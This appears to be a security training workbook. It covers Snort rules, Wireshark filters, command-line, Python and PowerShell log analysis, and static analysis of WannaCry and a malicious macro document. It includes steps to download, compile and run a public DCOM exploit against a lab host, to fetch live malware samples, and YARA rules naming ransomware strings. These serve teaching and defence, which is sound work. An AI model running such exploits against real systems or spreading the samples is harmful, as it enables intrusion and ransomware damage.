Field 2: Protocol - Snort understands a few types of traffic (tcp, udp, icmp)

Field 3: Source IP (can be a variable like $External_Net, or an IP, or a range)

Field 4: Source Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)

Field 5: Traffic Direction (->)

Field 6: Destination IP (can be a variable like $External_Net, or an IP, or a range)

Field 7: Destination Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)

Field 8: MSG - what is actually displayed on the analysts machine


Let's look at 2 simple rules
----------------------------------------------------------------------------------
alert tcp $EXTERNAL_NET any -> $HOME_NET 135 (msg:”NETBIOS DCERPC ISystemActivator \
bind attempt”; flow:to_server,established; content:”|05|”; distance:0; within:1; \
content:”|0b|”; distance:1; within:1; byte_test:1,&,1,0,relative; content:”|A0 01 00 \
00 00 00 00 00 C0 00 00 00 00 00 00 46|”; distance:29; within:16; \
reference:cve,CAN-2003-0352; classtype:attempted-admin; sid:2192; rev:1;)

alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:”NETBIOS SMB DCERPC ISystemActivator bind \
attempt”; flow:to_server,established; content:”|FF|SMB|25|”; nocase; offset:4; \
depth:5; content:”|26 00|”; distance:56; within:2; content:”|5c \
00|P|00|I|00|P|00|E|00 5c 00|”; nocase; distance:5; within:12; content:”|05|”; \
distance:0; within:1; content:”|0b|”; distance:1; within:1; \
byte_test:1,&,1,0,relative; content:”|A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 \
46|”; distance:29; within:16; reference:cve,CAN-2003-0352; classtype:attempted-admin; \
sid:2193; rev:1;)
----------------------------------------------------------------------------------



From your Linux machine ping your Windows machine
ping 192.168.150.1



Start wireshark and let's create some simple filters:

Filter 1: 
ip.addr==192.168.150.1


Filter 2:
ip.addr==192.168.150.1 && icmp



Filter 3:
ip.addr==192.168.150.1 && !(tcp.port==22)

Now stop your capture and restart it (make sure you keep the filter)




Back to your Linux machine:
[ CTRL-C ] - to stop your ping

wget http://downloads.securityfocus.com/vulnerabilities/exploits/oc192-dcom.c


gcc -o exploit oc192-dcom.c

./exploit


./exploit -d 192.168.150.1 -t 0




Now go back to WireShark and stop the capture.












       
 
#################
#  Log Analysis #
#################

VM for these labs
-----------------
- InfoSec Addicts Ubuntu Virtual Machine
https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
user: infosecaddicts
pass: infosecaddicts
 

- Windows 7 Virtual Machine
https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
user: workshop
pass: password




##############################################
# Log Analysis with Linux command-line tools #
##############################################
The following command line executables are found in the Mac as well as most Linux Distributions.

cat –  prints the content of a file in the terminal window
grep – searches and filters based on patterns
awk –  can sort each row into fields and display only what is needed
sed –  performs find and replace functions
sort – arranges output in an order
uniq – compares adjacent lines and can report, filter or provide a count of duplicates




##############
# Cisco Logs #
##############

wget https://s3.amazonaws.com/infosecaddictsfiles/cisco.log


AWK Basics
----------
To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.

cat cisco.log | awk '{print $5}' | tail -n 4




Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in “$5”, group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through “sort“, using “uniq -c” to count the like entries, then using “sort -rn” to sort it in reverse order.

cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn




While that’s sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren’t conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain “facility-level-mnemonic”.

cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn





Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.

cat cisco.log | grep %LINEPROTO-5-UPDOWN:

cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn

cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn

cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn




#################################
# Using Python for log analysis #
#################################




###########################################
# Python Basics Lesson 1: Simple Printing #
###########################################

>>> print 1

>>> print hello

>>> print "hello"
 
>>> print "Today we are learning Python."
 
 
 
###################################################
# Python Basics Lesson 2: Simple Numbers and Math #
###################################################
 
>>> 2+2
 
>>> 6-3
 
>>> 18/7
 
>>> 18.0/7
 
>>> 18.0/7.0
 
>>> 18/7
 
>>> 9%4
 
>>> 8%4
 
>>> 8.75%.5
 
>>> 6.*7
 
>>> 6*6*6
 
>>> 6**3
 
>>> 5**12
 
>>> -5**4
 
 
 
 
 
 
#####################################
# Python Basics Lesson 3: Variables #
#####################################
 
>>> x=18
 
>>> x+15
 
>>> x**3
 
>>> y=54
 
>>> x+y
 
>>> age=input("Enter number here: ")
        43
 
>>> age+32
 
>>> age**3

>>> fname = raw_input("Enter your first name: ")

>>> lname = raw_input("Enter your first name: ")

>>> fname = raw_input("Enter your name: ")
Enter your name: Joe

>>> lname = raw_input("Enter your name: ")
Enter your name: McCray

>>> print fname
Joe

>>> print lname
McCray

>>> print fname lname

>>> print fname+lname
JoeMcCray

 
 
NOTE:
Use "input() for integers and expressions, and use raw_input() when you are dealing with strings. 
 
 
 
 
 
#################################################
# Python Basics Lesson 4: Modules and Functions #
#################################################
 
>>> 5**4
 
>>> pow(5,4)
 
>>> abs(-18)
 
>>> abs(5)
 
>>> floor(18.7)
 
>>> import math
 
>>> math.floor(18.7)
 
>>> math.sqrt(81)
 
>>> joe = math.sqrt
 
>>> joe(9)
 
>>> joe=math.floor
 
>>> joe(19.8)
 
 
 
 
 
 
 
 
 
###################################
# Python Basics Lesson 5: Strings #
###################################
 
>>> "XSS"
 
>>> 'SQLi'
 
>>> "Joe's a python lover"
 
>>> 'Joe\'s a python lover'
 
>>> "Joe said \"InfoSec is fun\" to me"
 
>>> a = "Joe"
 
>>> b = "McCray"
 
>>> a, b
 
>>> a+b
 
 
 
 
 
 
 
 
########################################
# Python Basics Lesson 6: More Strings #
########################################
 
>>> num = 10
 
>>> num + 2
 
>>> "The number of open ports found on this system is " + num
 
>>> num = str(18)
 
>>> "There are " + num + " vulnerabilities found in this environment."
 
>>> num2 = 46
 
>>> "As of 08/20/2012, the number of states that enacted the Security Breach Notification Law is " + `num2`
 

 
NOTE:
Use "input() for integers and expressions, and use raw_input() when you are dealing with strings.
 
 
 
 
 
 
 
###############################################
# Python Basics Lesson 7: Sequences and Lists #
###############################################
 
>>> attacks = ['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
 
>>> attacks
['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
 
>>> attacks[3]
'SQL Injection'
 
>>> attacks[-2]
'Cross-Site Scripting'
 
 
 
 
 
 
########################################
# Python Basics Level 8: If Statement #
########################################
>>> attack="SQLI"
>>> if attack=="SQLI":
        print 'The attacker is using SQLI'
 
>>> attack="XSS"
>>> if attack=="SQLI":
        print 'The attacker is using SQLI'

 
#############################
# Reference Videos To Watch #
#############################
Here is your first set of youtube videos that I'd like for you to watch:
https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA (watch videos 1-10)
 
 
 
 
 
#####################################
# Lesson 9: Intro to Log Analysis #
#####################################
 
Login to your StrategicSec Ubuntu machine. You can download the VM from the following link:
 
- InfoSec Addicts Ubuntu Virtual Machine
https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
user: infosecaddicts
pass: infosecaddicts
 

 
Then execute the following commands:
---------------------------------------------------------------------------------------------------------
 
 
wget https://s3.amazonaws.com/infosecaddictsfiles/access_log
 
 
cat access_log | grep 141.101.80.188
 
cat access_log | grep 141.101.80.187
 
cat access_log | grep 108.162.216.204
 
cat access_log | grep 173.245.53.160
 
---------------------------------------------------------
 
Google the following terms:
        - Python read file
        - Python read line
        - Python read from file
 
 
 
 
########################################################
# Lesson 10: Use Python to read in a file line by line #
########################################################
 
 
Reference:
http://cmdlinetips.com/2011/08/three-ways-to-read-a-text-file-line-by-line-in-python/






Let's have some fun.....


>>> f = open('access_log', "r")

>>> lines = f.readlines()

>>> print lines

>>> lines[0]

>>> lines[10]

>>> lines[50]

>>> lines[1000]

>>> lines[5000]

>>> lines[10000]

>>> print len(lines)






 
 
 
---------------------------------------------------------
vi logread1.py
 
 
## Open the file with read only permit
f = open('access_log', "r")
 
## use readlines to read all lines in the file
## The variable "lines" is a list containing all lines
lines = f.readlines()
 
print lines
 
 
## close the file after reading the lines.
f.close()
 
---------------------------------------------------------
 
 
Google the following:
        - python difference between readlines and readline
        - python readlines and readline
 
 
 
 
 
#################################
# Lesson 11: A quick challenge #
#################################
 
Can you write an if/then statement that looks for this IP and print "Found it"?
 
 
141.101.81.187
 
 
 
 
 
 
---------------------------------------------------------
Hint 1: Use Python to look for a value in a list
 
Reference:
http://www.wellho.net/mouth/1789_Looking-for-a-value-in-a-list-Python.html
 
 
 
 
---------------------------------------------------------
Hint 2: Use Python to prompt for user input
 
Reference:
http://www.cyberciti.biz/faq/python-raw_input-examples/
 
 
 
 
---------------------------------------------------------
Hint 3: Use Python to search for a string in a list
 
Reference:
http://stackoverflow.com/questions/4843158/check-if-a-python-list-item-contains-a-string-inside-another-string
 
 
 
 
 
Here is my solution:
-------------------
$ python
>>> f = open('access_log', "r")
>>> lines = f.readlines()
>>> ip = '141.101.81.187'
>>> for string in lines:
...     if ip in string:
...             print(string)
 
 
 
 
Here is one student's solution - can you please explain each line of this code to me?
-------------------------------------------------------------------------------------
#!/usr/bin/python
 
f = open('access_log')
 
strUsrinput = raw_input("Enter IP Address: ")
 
for line in iter(f):
    ip = line.split(" - ")[0]
    if ip == strUsrinput:
        print line
 
f.close()
 
 
 
 
-------------------------------
 
Working with another student after class we came up with another solution:
 
#!/usr/bin/env python
 
 
# This line opens the log file
f=open('access_log',"r")
 
# This line takes each line in the log file and stores it as an element in the list
lines = f.readlines()
 
 
# This lines stores the IP that the user types as a var called userinput
userinput = raw_input("Enter the IP you want to search for: ")
 
 
 
# This combination for loop and nested if statement looks for the IP in the list called lines and prints the entire line if found.
for ip in lines:
    if ip.find(userinput) != -1:
        print ip
 
 
 
##################################################
# Lesson 12: Look for web attacks in a log file #
##################################################
 
In this lab we will be looking at the scan_log.py script and it will scan the server log to find out common hack attempts within your web server log.
Supported attacks:
1.          SQL Injection
2.          Local File Inclusion
3.          Remote File Inclusion
4.          Cross-Site Scripting
 
 
 
wget https://s3.amazonaws.com/infosecaddictsfiles/scan_log.py
 
The usage for scan_log.py is simple.  You feed it an apache log file.
 
cat scan_log.py | less                  (use your up/down arrow keys to look through the file)





################################
# Log Analysis with Powershell #
################################

VM for these labs
-----------------
https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
        username: workshop
        password: password

 
You can do the updates in the Win7 VM (yes, it is a lot of updates).
 
You'll need to create directory in the Win7 VM called "c:\ps"
 
#####################
# Powershell Basics #
#####################
 
PowerShell is Microsoft’s new scripting language that has been built in since the release Vista.
 
PowerShell file extension end in .ps1 .
 
An important note is that you cannot double click on a PowerShell script to execute it.
 
To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
 
dir
cd
ls
cd c:\
 
 
To obtain a list of cmdlets, use the Get-Command cmdlet
 
Get-Command
 
 
 
You can use the Get-Alias cmdlet to see a full list of aliased commands.
 
Get-Alias
 
 
 
Don't worry you won't blow up your machine with Powershell
Get-Process | stop-process                              What will this command do?
Get-Process | stop-process -whatif
 
 
To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
 
Get-Help Get-Command
 
Get-Help Get-Service –online
 
Get-Service -Name TermService, Spooler
 
Get-Service –N BITS
 
Start-Transcript
 
PowerShell variables begin with the $ symbol. First lets create a variable
 
$serv = Get-Service –N Spooler
 
To see the value of a variable you can just call it in the terminal.
 
$serv
 
$serv.gettype().fullname
 
 
Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
 
$serv | Get-Member
 
Get-Member -InputObject $serv
 
 
 
 
 
Let’s use a method and a property with our object.
 
$serv.Status
$serv.Stop()
$serv.Refresh()
$serv.Status
$serv.Start()
$serv.Refresh()
$serv.Status
 
 
 
 
Methods can return properties and properties can have sub properties. You can chain them together by appending them to the first call.
 
 
 
#############################
# Simple Event Log Analysis #
#############################
 
Step 1: Dump the event logs
---------------------------
The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
 
To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs.
If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
 
Get-EventLog -LogName application | Export-Clixml Applog.xml
 
type .\Applog.xml
 
$logs = "system","application","security"
 
The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
 
$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
 
 
 
Step 2: Import the event log of interest
----------------------------------------
To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files.
Store the results in a variable.
Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object.
 
The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
 
$seclog = Import-Clixml security.xml
 
$seclog | select -Last 5
 
 
Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
 
Get-EventLog Application -After (Get-Date).AddDays(-1)
 
You can use '-after' and '-before' to filter date ranges
 
One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything.
By default, an ordinary user does not have permission to read the security log.
 
 
Step 3: Drill into a specific entry
-----------------------------------
To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties.
 
 
$seclog | select -first 1 | fl *
 
The message property contains the SID, account name, user domain, and privileges that are assigned for the new login.
 
 
($seclog | select -first 1).message
 
(($seclog | select -first 1).message).gettype()
 
 
 
In the *nix world you often want a count of something (wc -l).
How often is the SeSecurityPrivilege privilege mentioned in the message property?
To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
 
$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
 
If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property.
 
 
$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
 
Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present.
Use the count property to determine the total number of entries in the event log.
 
$seclog.Count
 
 
 
 
 
 
############################
# Simple Log File Analysis #
############################
 
 
You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
 
 
mkdir c:\ps
cd c:\ps
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
 
 
 
 
       
       
       
 
###############################################
# Intrusion Analysis Using Windows PowerShell #
###############################################
 
Download sample file http://pastebin.com/raw.php?i=ysnhXxTV into the c:\ps directory
 
 
 
 
 
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
 
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
 
 
 
 
The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
 
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
 
 
 
 
To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
 
Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
 
 
 
To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output.
 
Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
 
 
 
Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses.
 
Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
 
 
In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
 
Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
 
 
 

 
 
##############################################
# Parsing Log files using windows PowerShell #
##############################################
 
Download the sample IIS log http://pastebin.com/LBn64cyA
 
 
(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
 
Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
 
 
 
The above command would give us all the WebDAV requests.
 
To filter this to a particular user name, use the below command:
 
Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
 
 
 
Some more options that will be more commonly required :
 
For Outlook Web Access : Replace WebDAV with OWA
 
For EAS : Replace WebDAV with Microsoft-server-activesync
 
For ECP : Replace WebDAV with ECP
 
 
 
To find out the count of the EWS request we can go ahead and run the below command
 
(Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "Useralias")}).count







################################
# Good references for WannaCry #
################################

References:

https://gist.github.com/rain-1/989428fa5504f378b993ee6efbc0b168
https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html



############################
# Download the Analysis VM #
############################
https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
user: infosecaddicts
pass: infosecaddicts



- Log in to your Ubuntu system with the username 'infosecaddicts' and the password 'infosecaddicts'.






################
# The Scenario #
################
You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).


The fastest thing you can do is perform static analysis. 

sudo pip install olefile
     infosecaddicts
 
mkdir ~/Desktop/oledump
 
cd ~/Desktop/oledump
 
wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
 
unzip oledump_V0_0_22.zip
 
wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
 
unzip 064016.zip
     infected
 
python oledump.py 064016.doc
 
python oledump.py 064016.doc -s A4 -v
 
- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
 
 
python oledump.py 064016.doc -s A5 -v
 
- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
 
 
python oledump.py 064016.doc -s A3 -v
 
- Look for "GVhkjbjv" and you should see:
 

 
- Take that long blob that starts with 636D and finishes with 653B and paste it in:
http://www.rapidtables.com/convert/number/hex-to-ascii.htm



###################
# Static Analysis #
###################

- After logging please open a terminal window and type the following commands:

cd Desktop/

wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip

unzip wannacry.zip
     infected

file wannacry.exe

mv wannacry.exe malware.pdf

file malware.pdf

mv malware.pdf wannacry.exe
 
hexdump -n 2 -C wannacry.exe
 



***What is '4d 5a' or 'MZ'***
Reference: 
http://www.garykessler.net/library/file_sigs.html
 




objdump -x wannacry.exe
 
strings wannacry.exe

strings --all wannacry.exe | head -n 6
 
strings wannacry.exe | grep -i dll
 
strings wannacry.exe | grep -i library

strings wannacry.exe | grep -i reg

strings wannacry.exe | grep -i key

strings wannacry.exe | grep -i rsa

strings wannacry.exe | grep -i open

strings wannacry.exe | grep -i get

strings wannacry.exe | grep -i mutex

strings wannacry.exe | grep -i irc

strings wannacry.exe | grep -i join			

strings wannacry.exe | grep -i admin

strings wannacry.exe | grep -i list








 


Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"

Quick Google search for "wannacry ransomeware analysis"


Reference
https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/

- Yara Rule - 


Strings:
$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
$s2 = “Wanna Decryptor” wide ascii nocase
$s3 = “.wcry” wide ascii nocase
$s4 = “WANNACRY” wide ascii nocase
$s5 = “WANACRY!” wide ascii nocase
$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase








Ok, let's look for the individual strings



strings wannacry.exe | grep -i ooops

strings wannacry.exe | grep -i wanna

strings wannacry.exe | grep -i wcry

strings wannacry.exe | grep -i wannacry

strings wannacry.exe | grep -i wanacry			**** Matches $s5, hmmm.....







####################################
# Tired of GREP - let's try Python #
####################################
Decided to make my own script for this kind of stuff in the future. I

Reference1:
https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py

This is a really good script for the basics of static analysis

Reference:
https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html


This is really good for showing some good signatures to add to the Python script


Here is my own script using the signatures (started this yesterday, but still needs work):
https://pastebin.com/guxzCBmP




sudo apt install -y python-pefile
     infosecaddicts



wget https://pastebin.com/raw/guxzCBmP


mv guxzCBmP am.py


vi am.py

python am.py wannacry.exe










##############
# Yara Ninja #
##############
cd ~/Desktop

sudo apt-get remove -y yara
     infosecaddcits

sudo apt -y install libtool
     infosecaddicts

wget https://github.com/VirusTotal/yara/archive/v3.6.0.zip


unzip v3.6.0.zip

cd yara-3.6.0

./bootstrap.sh

./configure

make

sudo make install
	infosecaddicts

yara -v

cd ~/Desktop




NOTE:
McAfee is giving these yara rules - so add them to the hashes.txt file

Reference:
https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/

----------------------------------------------------------------------------
rule wannacry_1 : ransom
{
	meta:
		author = "Joshua Cannell"
		description = "WannaCry Ransomware strings"
		weight = 100
		date = "2017-05-12"
 
	strings:
		$s1 = "Ooops, your files have been encrypted!" wide ascii nocase
		$s2 = "Wanna Decryptor" wide ascii nocase
		$s3 = ".wcry" wide ascii nocase
		$s4 = "WANNACRY" wide ascii nocase
		$s5 = "WANACRY!" wide ascii nocase
		$s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
 
	condition:
		any of them
}

----------------------------------------------------------------------------
rule wannacry_2{
	meta:
		author = "Harold Ogden"
		description = "WannaCry Ransomware Strings"
		date = "2017-05-12"
		weight = 100

	strings:
		$string1 = "msg/m_bulgarian.wnry"
		$string2 = "msg/m_chinese (simplified).wnry"
		$string3 = "msg/m_chinese (traditional).wnry"
		$string4 = "msg/m_croatian.wnry"
		$string5 = "msg/m_czech.wnry"
		$string6 = "msg/m_danish.wnry"
		$string7 = "msg/m_dutch.wnry"
		$string8 = "msg/m_english.wnry"
		$string9 = "msg/m_filipino.wnry"
		$string10 = "msg/m_finnish.wnry"
		$string11 = "msg/m_french.wnry"
		$string12 = "msg/m_german.wnry"
		$string13 = "msg/m_greek.wnry"
		$string14 = "msg/m_indonesian.wnry"
		$string15 = "msg/m_italian.wnry"
		$string16 = "msg/m_japanese.wnry"
		$string17 = "msg/m_korean.wnry"
		$string18 = "msg/m_latvian.wnry"
		$string19 = "msg/m_norwegian.wnry"
		$string20 = "msg/m_polish.wnry"
		$string21 = "msg/m_portuguese.wnry"
		$string22 = "msg/m_romanian.wnry"
		$string23 = "msg/m_russian.wnry"
		$string24 = "msg/m_slovak.wnry"
		$string25 = "msg/m_spanish.wnry"
		$string26 = "msg/m_swedish.wnry"
		$string27 = "msg/m_turkish.wnry"
		$string28 = "msg/m_vietnamese.wnry"


	condition:
		any of ($string*)
}
----------------------------------------------------------------------------


#######################
# External DB Lookups #
#######################

Creating a malware database (sqlite)
------------------------------------
sudo apt install -y python-simplejson python-simplejson-dbg
	infosecaddicts



wget https://raw.githubusercontent.com/mboman/mart/master/bin/avsubmit.py



python avsubmit.py -f wannacry.exe -e


Analysis of the file can be found at: 
http://www.threatexpert.com/report.aspx?md5=84c82835a5d21bbcf75a61706d8ab549









###############################
# Creating a Malware Database #
###############################
Creating a malware database (mysql)
-----------------------------------
- Step 1: Installing MySQL database
- Run the following command in the terminal:

sudo apt install -y mysql-server
     infosecaddicts
	 
- Step 2: Installing Python MySQLdb module
- Run the following command in the terminal:

sudo apt-get build-dep python-mysqldb
     infosecaddicts

sudo apt install -y python-mysqldb
     infosecaddicts

Step 3: Logging in 
Run the following command in the terminal:

mysql -u root -p					(set a password of 'malware')

- Then create one database by running following command:

create database malware;

exit;

wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py

vi mal_to_db.py						(fill in database connection information)

python mal_to_db.py -i

------- check it to see if the files table was created ------

mysql -u root -p
	malware

show databases;

use malware;

show tables;

describe files;

exit;

---------------------------------


- Now add the malicious file to the DB

python mal_to_db.py -f wannacry.exe -u



- Now check to see if it is in the DB

mysql -u root -p
	malware

mysql> use malware;

select id,md5,sha1,sha256,time FROM files;

mysql> quit;